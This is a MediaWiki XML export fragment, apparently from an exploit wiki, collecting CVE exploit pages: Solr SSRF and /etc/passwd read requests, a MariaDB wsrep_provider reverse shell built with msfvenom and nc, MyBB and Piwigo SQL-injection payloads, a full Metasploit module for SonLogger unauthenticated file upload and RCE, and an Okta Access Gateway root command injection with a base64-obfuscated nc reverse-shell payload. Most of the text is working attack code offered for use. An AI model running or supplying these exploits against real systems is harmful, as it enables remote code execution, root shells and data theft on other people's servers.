&lt;pre&gt;
GET /solr/test/replication?command=fetchindex&amp;masterUrl=http://127.0.0.1/&amp;wt=json&amp;httpBasicAuthUser=&amp;httpBasicAuthPassword= HTTP/1.1
HOST:target
....
&lt;/pre&gt;

&lt;pre&gt;
GET http://xxxxx/solr/xxxx/debug/dump?stream.url=file:///etc/passwd&amp;param=ContentStream HTTP/1.1
HOST:target
...
&lt;/pre&gt;</text>
      <sha1>o83nw7mstk52xvpfqc1gr93q8uqhsax</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27928 MariaDB 10.2 /MySQL - 'wsrep provider' 命令注入漏洞</title>
    <ns>0</ns>
    <id>1321</id>
    <revision>
      <id>1661</id>
      <timestamp>2021-04-14T08:57:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution # Date: 03/18/2021 # Exploit Author: Central InfoSec # Version: MariaDB 10.2 before..."</comment>
      <origin>1661</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="810" sha1="26nhv0n13ksbl48j2x633756yfsyrcj" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution
# Date: 03/18/2021
# Exploit Author: Central InfoSec
# Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL
# Tested on: Linux
# CVE : CVE-2021-27928

# Proof of Concept:

# Create the reverse shell payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f elf-so -o CVE-2021-27928.so

# Start a listener
nc -lvp &lt;port&gt;

# Copy the payload to the target machine (In this example, SCP/SSH is used)
scp CVE-2021-27928.so &lt;user&gt;@&lt;ip&gt;:/tmp/CVE-2021-27928.so

# Execute the payload
mysql -u &lt;user&gt; -p -h &lt;ip&gt; -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'
&lt;/pre&gt;</text>
      <sha1>26nhv0n13ksbl48j2x633756yfsyrcj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27946 MyBB民意調查中投票數量SQL注入漏洞</title>
    <ns>0</ns>
    <id>345</id>
    <revision>
      <id>519</id>
      <timestamp>2021-03-21T02:31:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt;  &lt;pre&gt; &lt; 1.8.26 &lt;/pre&gt;  &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 首先創建一個帖子： &lt;/translate..."</comment>
      <origin>519</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="659" sha1="3y8hdlnb731qiy880ugqgykrrjg08d4" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
首先創建一個帖子：
&lt;/translate&gt;

[[File:1.jpg | 500px]]

&lt;translate&gt;
接著設置投票:
&lt;/translate&gt;

[[File:2.jpg | 500px]]

&lt;translate&gt;
編輯投票(右下角)

插入payload：（這裡採用延時注入驗證漏洞）
&lt;/translate&gt;

&lt;pre&gt;
1' and sleep(10) and '
&lt;/pre&gt;

[[File:3.jpg | 500px]]

&lt;translate&gt;
拉到最下面的Moderation Options，選擇move / copy thread
&lt;/translate&gt;

[[File:4.jpg | 500px]]

&lt;translate&gt;
點擊move/copy thread按鈕，抓包分析,發現成功延時，驗證成功
&lt;/translate&gt;</text>
      <sha1>3y8hdlnb731qiy880ugqgykrrjg08d4</sha1>
    </revision>
    <revision>
      <id>520</id>
      <parentid>519</parentid>
      <timestamp>2021-03-21T02:31:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>520</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="747" sha1="tm7yv1yl5clv8ipku161egu3fcanxcg" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
首先創建一個帖子：
&lt;/translate&gt;

[[File:1.jpg | 500px]]

&lt;translate&gt;
&lt;!--T:4--&gt;
接著設置投票:
&lt;/translate&gt;

[[File:2.jpg | 500px]]

&lt;translate&gt;
&lt;!--T:5--&gt;
編輯投票(右下角)

&lt;!--T:6--&gt;
插入payload：（這裡採用延時注入驗證漏洞）
&lt;/translate&gt;

&lt;pre&gt;
1' and sleep(10) and '
&lt;/pre&gt;

[[File:3.jpg | 500px]]

&lt;translate&gt;
&lt;!--T:7--&gt;
拉到最下面的Moderation Options，選擇move / copy thread
&lt;/translate&gt;

[[File:4.jpg | 500px]]

&lt;translate&gt;
&lt;!--T:8--&gt;
點擊move/copy thread按鈕，抓包分析,發現成功延時，驗證成功
&lt;/translate&gt;</text>
      <sha1>tm7yv1yl5clv8ipku161egu3fcanxcg</sha1>
    </revision>
    <revision>
      <id>5375</id>
      <parentid>520</parentid>
      <timestamp>2021-06-19T11:10:59Z</timestamp>
      <contributor>
        <username>K</username>
        <id>369</id>
      </contributor>
      <minor/>
      <origin>5375</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="755" sha1="r1b7fzcxcoum3u4zrmsyk0fkxzm8uon" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

&lt;translate&gt;
&lt;html&gt;

==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
首先創建一個帖子：
&lt;/translate&gt;

[[File:1.jpg | 500px]]

&lt;translate&gt;
&lt;!--T:4--&gt;
接著設置投票:
&lt;/translate&gt;

[[File:2.jpg | 500px]]

&lt;translate&gt;
&lt;!--T:5--&gt;
編輯投票(右下角)

&lt;!--T:6--&gt;
插入payload：（這裡採用延時注入驗證漏洞）
&lt;/translate&gt;

&lt;pre&gt;
1' and sleep(10) and '
&lt;/pre&gt;

[[File:3.jpg | 500px]]

&lt;translate&gt;
&lt;!--T:7--&gt;
拉到最下面的Moderation Options，選擇move / copy thread
&lt;/translate&gt;

[[File:4.jpg | 500px]]

&lt;translate&gt;
&lt;!--T:8--&gt;
點擊move/copy thread按鈕，抓包分析,發現成功延時，驗證成功
&lt;/translate&gt;</text>
      <sha1>r1b7fzcxcoum3u4zrmsyk0fkxzm8uon</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27946 MyBB民意調查中投票數量SQL注入漏洞/es</title>
    <ns>0</ns>
    <id>3987</id>
    <revision>
      <id>4604</id>
      <timestamp>2021-06-10T02:59:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Primero crea una publicación:"</comment>
      <origin>4604</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="641" sha1="janm89wqxrrjkwxpwio0a9ir65t7v8m" xml:space="preserve">&lt;languages  /&gt;
== Versión afectada ==

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

== Explotar ==

Primero crea una publicación:

[[File:1.jpg | 500px]]

Luego configure la votación:

[[File:2.jpg | 500px]]

Editar voto (esquina inferior derecha)

Insertar carga útil: (aquí se usa la vulnerabilidad de verificación de inyección retrasada)

&lt;pre&gt;
1' and sleep(10) and '
&lt;/pre&gt;

[[File:3.jpg | 500px]]

Tire hacia la parte inferior Opciones de moderación, seleccione mover / copiar hilo

[[File:4.jpg | 500px]]

Haga clic en el botón mover / copiar hilo, capture el paquete y analícelo, y descubra que el retraso es exitoso y la verificación es exitosa</text>
      <sha1>janm89wqxrrjkwxpwio0a9ir65t7v8m</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27946 MyBB民意調查中投票數量SQL注入漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5083</id>
    <revision>
      <id>5823</id>
      <timestamp>2021-06-24T02:19:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "拉到最下面的Moderation Options，選擇move / copy thread"</comment>
      <origin>5823</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="484" sha1="gqp65777g2h5bdbn2ppnr3q6ji5ta1s" xml:space="preserve">&lt;languages  /&gt;
==影響版本==

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

==漏洞利用==

首先創建一個帖子：

[[File:1.jpg | 500px]]

接著設置投票:

[[File:2.jpg | 500px]]

編輯投票(右下角)

插入payload：（這裡採用延時注入驗證漏洞）

&lt;pre&gt;
1' and sleep(10) and '
&lt;/pre&gt;

[[File:3.jpg | 500px]]

拉到最下面的Moderation Options，選擇move / copy thread

[[File:4.jpg | 500px]]

點擊move/copy thread按鈕，抓包分析,發現成功延時，驗證成功</text>
      <sha1>gqp65777g2h5bdbn2ppnr3q6ji5ta1s</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27947 MyBB後台論壇複製SQL注入漏洞</title>
    <ns>0</ns>
    <id>362</id>
    <revision>
      <id>538</id>
      <timestamp>2021-03-21T02:45:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt;  &lt;pre&gt; &lt; 1.8.26 &lt;/pre&gt;  &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 首先創建一個論壇： &lt;/translate&gt;..."</comment>
      <origin>538</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="391" sha1="bq4zfobu3sgqqlulp1ralcx7gqkqepy" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
首先創建一個論壇：
&lt;/translate&gt;

[[File:5.jpg |500px]]

&lt;translate&gt;
注意這裡要配置密碼為payload：
&lt;/translate&gt;

&lt;pre&gt;
1 and sleep(10) and '
&lt;/pre&gt;

&lt;translate&gt;
接著在options裡點擊copy forum,可以看到成功延時。
&lt;/translate&gt;</text>
      <sha1>bq4zfobu3sgqqlulp1ralcx7gqkqepy</sha1>
    </revision>
    <revision>
      <id>539</id>
      <parentid>538</parentid>
      <timestamp>2021-03-21T02:46:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>539</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="446" sha1="n1c5pnlp4zl9jxanjkq1a6n9sdggblw" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
首先創建一個論壇：
&lt;/translate&gt;

[[File:5.jpg |500px]]

&lt;translate&gt;
&lt;!--T:4--&gt;
注意這裡要配置密碼為payload：
&lt;/translate&gt;

&lt;pre&gt;
1 and sleep(10) and '
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:5--&gt;
接著在options裡點擊copy forum,可以看到成功延時。
&lt;/translate&gt;</text>
      <sha1>n1c5pnlp4zl9jxanjkq1a6n9sdggblw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27947 MyBB後台論壇複製SQL注入漏洞/es</title>
    <ns>0</ns>
    <id>3984</id>
    <revision>
      <id>4601</id>
      <timestamp>2021-06-10T02:57:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Primero crea un foro:"</comment>
      <origin>4601</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="318" sha1="jhru8b8zv9l2ed3w50yjcvf384ood3h" xml:space="preserve">&lt;languages /&gt;
== Versión afectada ==

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

== Explotar ==

Primero crea un foro:

[[File:5.jpg |500px]]

Tenga en cuenta que la contraseña debe configurarse como carga útil aquí:

&lt;pre&gt;
1 and sleep(10) and '
&lt;/pre&gt;

Luego haga clic en copiar foro en las opciones, puede ver el retraso del éxito.</text>
      <sha1>jhru8b8zv9l2ed3w50yjcvf384ood3h</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27947 MyBB後台論壇複製SQL注入漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3063</id>
    <revision>
      <id>3564</id>
      <timestamp>2021-05-26T13:40:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "首先創建一個論壇："</comment>
      <origin>3564</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="266" sha1="4w3683tncz8mbuuchocptjuc1ukqhnn" xml:space="preserve">&lt;languages /&gt;
==影響版本==

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

==漏洞利用==

首先創建一個論壇：

[[File:5.jpg |500px]]

注意這裡要配置密碼為payload：

&lt;pre&gt;
1 and sleep(10) and '
&lt;/pre&gt;

接著在options裡點擊copy forum,可以看到成功延時。</text>
      <sha1>4w3683tncz8mbuuchocptjuc1ukqhnn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27948 MyBB後台用戶管理用戶組SQL注入漏洞</title>
    <ns>0</ns>
    <id>369</id>
    <revision>
      <id>546</id>
      <timestamp>2021-03-21T02:51:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==影響版本== &lt;/translate&gt;  &lt;pre&gt; &lt; 1.8.26 &lt;/pre&gt;  &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 先隨便創個用戶組，接著新..."</comment>
      <origin>546</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="529" sha1="nnmwpwg5wzru2t3mctdagq8kojg7yuw" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
先隨便創個用戶組，接著新建一個用戶，並設置他的用戶組；

在profile中選擇組；

點擊保存抓包分析；

修改addtionalgroups參數為sql注入payload：
&lt;/translate&gt;
&lt;pre&gt;
1‘ and sleep(10) and '
&lt;/pre&gt;

&lt;translate&gt;
選擇banning模塊，並選擇我們剛剛設置的用戶;

點擊“Ban user”，抓包分析;

可以看到成功延時。
&lt;/translate&gt;</text>
      <sha1>nnmwpwg5wzru2t3mctdagq8kojg7yuw</sha1>
    </revision>
    <revision>
      <id>547</id>
      <parentid>546</parentid>
      <timestamp>2021-03-21T02:52:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>547</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="628" sha1="p2tjgls779puqu3iu1vsxfdk765428q" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
先隨便創個用戶組，接著新建一個用戶，並設置他的用戶組；

&lt;!--T:4--&gt;
在profile中選擇組；

&lt;!--T:5--&gt;
點擊保存抓包分析；

&lt;!--T:6--&gt;
修改addtionalgroups參數為sql注入payload：
&lt;/translate&gt;
&lt;pre&gt;
1‘ and sleep(10) and '
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:7--&gt;
選擇banning模塊，並選擇我們剛剛設置的用戶;

&lt;!--T:8--&gt;
點擊“Ban user”，抓包分析;

&lt;!--T:9--&gt;
可以看到成功延時。
&lt;/translate&gt;</text>
      <sha1>p2tjgls779puqu3iu1vsxfdk765428q</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27948 MyBB後台用戶管理用戶組SQL注入漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5092</id>
    <revision>
      <id>5832</id>
      <timestamp>2021-06-24T02:31:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用=="</comment>
      <origin>5832</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="429" sha1="tun4spk2sdl3tgdfbtvmdhxzpo6owlp" xml:space="preserve">&lt;languages  /&gt;

==影響版本==

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;

==漏洞利用==

先隨便創個用戶組，接著新建一個用戶，並設置他的用戶組；

在profile中選擇組；

點擊保存抓包分析；

修改addtionalgroups參數為sql注入payload：
&lt;pre&gt;
1‘ and sleep(10) and '
&lt;/pre&gt;

選擇banning模塊，並選擇我們剛剛設置的用戶;

點擊“Ban user”，抓包分析;

可以看到成功延時。</text>
      <sha1>tun4spk2sdl3tgdfbtvmdhxzpo6owlp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27964 SonLogger 4.2.3.3 未經身份驗證任意文件上傳漏洞</title>
    <ns>0</ns>
    <id>1014</id>
    <revision>
      <id>1288</id>
      <timestamp>2021-04-09T02:38:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==MSF EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitMod..."</comment>
      <origin>1288</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4466" sha1="ckmlqvjtkpcg3l9vd6o1d3mxhqcb2ag" xml:space="preserve">==MSF EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::EXE
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'SonLogger Arbitrary File Upload Exploit',
        'Description' =&gt; %q{
          This module exploits an unauthenticated arbitrary file upload
          via insecure POST request. It has been tested on version &lt; 6.4.1 in
          Windows 10 Enterprise.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'Berkan Er &lt;b3rsec@protonmail.com&gt;' # Vulnerability discovery, PoC and Metasploit module
          ],
        'References' =&gt;
          [
            ['CVE', '2021-27964'],
            ['URL', 'https://erberkan.github.io/2021/SonLogger-vulns/']
          ],

        'Platform' =&gt; ['win'],
        'Privileged' =&gt; false,
        'Arch' =&gt; [ARCH_X86, ARCH_X64],
        'Targets' =&gt;
          [
            [
              'SonLogger &lt; 6.4.1',
              {
                'Platform' =&gt; 'win'
              }
            ],
          ],
        'DisclosureDate' =&gt; '2021-03-01',
        'DefaultTarget' =&gt; 0
      )
    )

    register_options(
      [
        Opt::RPORT(5000),
        OptString.new('TARGETURI', [true, 'The base path to the SonLogger', '/'])
      ]
    )
  end

  def check_product_info
    send_request_cgi(
      'uri' =&gt; normalize_uri(target_uri.path, '/shared/GetProductInfo'),
      'method' =&gt; 'POST',
      'data' =&gt; '',
      'headers' =&gt; {
        'Accept' =&gt; 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language' =&gt; 'en-US,en;q=0.5',
        'Accept-Encoding' =&gt; 'gzip, deflate',
        'X-Requested-With' =&gt; 'XMLHttpRequest'
      }
    )
  end

  def check
    begin
      res = check_product_info

      unless res
        return CheckCode::Unknown('Target is unreachable.')
      end

      unless res.code == 200
        return CheckCode::Unknown("Unexpected server response: #{res.code}")
      end

      version = Gem::Version.new(JSON.parse(res.body)['Version'])

      if version &lt; Gem::Version.new('6.4.1')
        CheckCode::Vulnerable("SonLogger version #{version}")
      else
        CheckCode::Safe("SonLogger version #{version}")
      end
    rescue JSON::ParserError
      fail_with(Failure::UnexpectedReply, 'The target may have been updated')
    end
  end

  def create_payload
    Msf::Util::EXE.to_exe_asp(generate_payload_exe).to_s
  end

  def exploit
    begin
      print_good('Generate Payload')
      data = create_payload

      boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(rand(5..14))}"
      post_data = "--#{boundary}\r\n"
      post_data &lt;&lt; "Content-Disposition: form-data; name=\"file\"; filename=\"#{rand_text_alphanumeric(rand(5..11))}.asp\"\r\n"
      post_data &lt;&lt; "Content-Type: image/png\r\n"
      post_data &lt;&lt; "\r\n#{data}\r\n"
      post_data &lt;&lt; "--#{boundary}\r\n"

      res = send_request_cgi(
        'method' =&gt; 'POST',
        'uri' =&gt; normalize_uri(target_uri.path, '/Config/SaveUploadedHotspotLogoFile'),
        'ctype' =&gt; "multipart/form-data; boundary=#{boundary}",
        'data' =&gt; post_data,
        'headers' =&gt; {
          'Accept' =&gt; 'application/json',
          'Accept-Language' =&gt; 'en-US,en;q=0.5',
          'X-Requested-With' =&gt; 'XMLHttpRequest'
        }
      )
      unless res
        fail_with(Failure::Unreachable, 'No response from server')
      end

      unless res.code == 200
        fail_with(Failure::Unknown, "Unexpected server response: #{res.code}")
      end

      json_res = begin
        JSON.parse(res.body)
      rescue JSON::ParserError
        nil
      end

      if json_res.nil? || json_res['Message'] == 'Error in saving file'
        fail_with(Failure::UnexpectedReply, 'Error uploading payload')
      end

      print_good('Payload has been uploaded')

      handler

      print_status('Executing payload...')
      send_request_cgi({
        'uri' =&gt; normalize_uri(target_uri.path, '/Assets/temp/hotspot/img/logohotspot.asp'),
        'method' =&gt; 'GET'
      }, 5)
    end
  rescue StandardError
    fail_with(Failure::UnexpectedReply, 'Failed to execute the payload')
  end
end
&lt;/pre&gt;</text>
      <sha1>ckmlqvjtkpcg3l9vd6o1d3mxhqcb2ag</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27973 Piwigo 11.3.0 - 'language' SQL注入漏洞</title>
    <ns>0</ns>
    <id>1650</id>
    <revision>
      <id>2054</id>
      <timestamp>2021-05-03T12:14:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Piwigo 11.3.0 - 'language' SQL # Author: @nu11secur1ty # Testing and Debugging: nu11secur1ty # Date: 04.30.2021 # Vendor: https://piwigo.org/ #..."</comment>
      <origin>2054</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1626" sha1="a86bxh2l9t6hhe1331y2mur7ahk0lf2" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Piwigo 11.3.0 - 'language' SQL
# Author: @nu11secur1ty
# Testing and Debugging: nu11secur1ty
# Date: 04.30.2021
# Vendor: https://piwigo.org/
# Link: https://github.com/Piwigo/Piwigo/releases/tag/11.3.0
# CVE: CVE-2021-27973

[+] Exploit Source:

#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug: @nu11secur1ty
# CVE-2021-27973

from selenium import webdriver
import time


#enter the link to the website you want to automate login.
website_link="http://192.168.1.3/piwigo/"

#enter your login username
username="admin"

#enter your login password
password="password"

#enter the element for username input field
element_for_username="username"

#enter the element for password input field
element_for_password="password"

#enter the element for submit button
element_for_submit="login"

print("Loading... ;)")
time.sleep(1)
browser = webdriver.Chrome()
browser.get((website_link))

try:
username_element = browser.find_element_by_name(element_for_username)
username_element.send_keys(username)
password_element  = browser.find_element_by_name(element_for_password)
password_element.send_keys(password)
signInButton = browser.find_element_by_name(element_for_submit)
signInButton.click()

# Languages Exploit
time.sleep(5)
browser.get(("
http://192.168.1.3/piwigo/admin.php?page=languages&amp;language=TR_CN%27%20or%20updatexml(1%2Cconcat(0x7e%2C(version()))%2C0)%20or%20%27&amp;action=activate"))

print("The payload for category Languages is deployed...\n")

except Exception:
#### This exception occurs if the element are not found in the webpage.
print("Some error occured :(")
            
&lt;/pre&gt;</text>
      <sha1>a86bxh2l9t6hhe1331y2mur7ahk0lf2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-28113 Okta Access Gateway 2020.5.5 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>5747</id>
    <revision>
      <id>6609</id>
      <timestamp>2021-07-10T02:05:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; Okta Access Gateway v2020.5.5 Post-Auth Remote Root RCE  CVE-2021-28113  ======= Details =======  There are two command injection bugs can that be triggered after authen..."</comment>
      <origin>6609</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4027" sha1="mkdb3sn3y1m73ybgp51cbmgqjrye6di" xml:space="preserve">&lt;pre&gt;
Okta Access Gateway v2020.5.5 Post-Auth Remote Root RCE

CVE-2021-28113

=======
Details
=======

There are two command injection bugs can that be triggered after authenticating to the web UI.
Since the injection occurs when a script is executed with sudo, the commands are ran with root
privileges.

BUG #1 - relay

Command injection as root in Applications via the 'relaydomain' field when passing
parameters to generateCert.sh. This is blind injection, so without monitoring logs or
local execution instrumentation, the output will not simply returned in the response.

Also, the included 'nc' binary that the system image includes has the -e flag available
which enables an exploitation easier via connect back shell.

[Request]

POST /api/v1/app/idp/[valid-IDP] HTTP/1.1
Host: gw-admin.domain.tld
Content-Type: application/json;charset=utf-8
X-CSRF-TOKEN: [placeholder]
Content-Length: 134
Cookie: CSRF-TOKEN=[placeholder]; JSESSIONID=[placeholder]; SessionCookie=[placeholder]

{"settings":
{"label":"test",
"type":"CERTHEADER2015_APP",
"relaydomain":"..$(whoami)", &lt;-- HERE
"groups":[],
"handlers":{}}
,"policies":[{}]}

[Response /w local instrumentation for monitoring]

pid=23033 executed [/bin/bash /opt/oag/bin/generateCert.sh -w -d .root ]

[Quick testing]

"relaydomain":"..$(reboot)"

and the system should reboot.

[Exploitation for reverse shell]

Note: for some bizzare reason, this payload worked for a period of time during testing, but was not generally reproducible afterwards.

1) generate base64 for the connect back command to be executed

$ echo -n "nc 10.0.0.111 5000 -e /bin/bash" | base64
bmMgMTAuMTAuMTAuMTc5IDU1NTUgLWUgL2Jpbi9iYXNo

2) start a listener

$ nc -l -p 5000
...

3) make the request with the payload (.. is required due to how it parses domains)

..$(echo${IFS}'bmMgMTAuMC4wLjExMSA1MDAwIC1lIC9iaW4vYmFzaA=='&gt;test;$(base64${IFS}-d${IFS}test))

4) get a root shell from the server

* connection from 10.0.0.77 *
python -c 'import pty; pty.spawn("/bin/bash")'

[0] root@oag.okta.com;/root#

BUG #2 - cookie

Command injection as root in Identity Providers via the 'cookieDomain' field when passing
parameters to generateCert.sh.

[Request]

POST /api/v1/setting/idp/local HTTP/1.1
Host: gw-admin.domain.tld
Content-Type: application/json;charset=utf-8
X-CSRF-TOKEN: [placeholder]
Content-Length: 222
Cookie: CSRF-TOKEN=[placeholder]; JSESSIONID=[placeholder]; SessionCookie=[placeholder]

{"subCategory":
"IDP_SAML_LOCAL",
"json":{
"name":"Local OAG IDP",
"host":"https://google.com",
"cookieDomain":"$(uname${IFS}-n)", &lt;-- HERE
"nameIDFormat":"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified",
"metadata":{}},
"$edit":true}

[Response /w local instrumentation for monitoring]

pid=22822 executed [/bin/bash /opt/oag/bin/generateCert.sh -w -d Linux oag 3.10.0-957.27.2.el7.x86_64
#1 SMP Mon Jul 29 17:46:05 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux uid=0(root) gid=0(root) groups=0(root) ]

[Quick testing]

"cookieDomain":"$(reboot)"

and the system should reboot.

[Exploitation for executing commands with output in the webroot]

Same note as the previous one; for some reason, this payload worked for a period of time during testing, but then stopped fully working (the bug was still there just less exploitable).

1) generate base64 for "ls -al /root" to be written to a location accessible via web request

$ echo -n "script -q -c ls\$IFS-al\$IFS/root /opt/oag/simpleSAMLphp/www/test.php" | base64 -w0
c2NyaXB0IC1xIC1jIGxzJElGUy1hbCRJRlMvcm9vdCAvb3B0L29hZy9zaW1wbGVTQU1McGhwL3d3dy90ZXN0LnBocA==

2) make the request with the payload

$(echo${IFS}'c2NyaXB0IC1xIC1jIGxzJElGUy1hbCRJRlMvcm9vdCAvb3B0L29hZy9zaW1wbGVTQU1McGhwL3d3dy90ZXN0LnBocA=='&gt;test;$(base64${IFS}-d${IFS}test))

3) check https://gw-admin.domain.tld/auth/test.php for the output of the command

===
Fix
===

The cookie bug was a "known issue" and fixed in v2020.9.3 and the relay bug was also fixed and no longer works on the latest v2021.2.1.

